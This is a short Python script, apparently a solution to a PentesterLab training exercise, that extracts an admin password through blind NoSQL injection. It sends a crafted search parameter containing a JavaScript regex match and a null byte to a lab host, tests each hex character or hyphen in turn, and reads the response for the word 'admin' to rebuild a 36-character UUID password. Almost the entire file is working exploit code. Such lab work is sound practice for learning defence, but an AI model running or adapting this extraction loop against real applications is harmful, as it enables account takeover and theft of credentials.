'''Functions to support the main program'''

def get_match(url):
    """Query the server with a given url. If the response contains the word admin twice"""
    import requests
    response = requests.get(url)
    position_of_first_ocurrent_of_admin = 1355
    upper_limit = 50000
    return response.text.find('admin', position_of_first_ocurrent_of_admin ,upper_limit)


def loop_and_return_password_if_match(url, password):
    """loop_and_return_password_if_match """
    ### TODO: find pattern  to generate this list
    list_chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', '-']

    for char in list_chars:
        password_updated = password + char
        query_params = f"?search=admin'%20%26%26%20this.password.match(/^{password_updated}.*/)%00"
        match = get_match(f'{url}/{query_params}')
        if match != -1:
            print(f'password_updated: {password_updated}')
            return password_updated


def retrieve_password():
    """Retrieve the password iteratively, by brute-force trial and error"""
    url = 'http://ptl-53e5f638-4f71d7ff.libcurl.so/'
    password = ''

    # In its canonical textual representation, the 16 octets of a UUID are represented as
    # # 32 hexadecimal (base-16) digits,
    # displayed in five groups separated by hyphens, in the form 8-4-4-4-12 for a total of 36 characters
    # (32 hexadecimal characters and 4 hyphens).
    # source: https://en.wikipedia.org/wiki/Universally_unique_identifier

    pass_length = 36

    while len(password) < pass_length:
        password = loop_and_return_password_if_match(url, password)


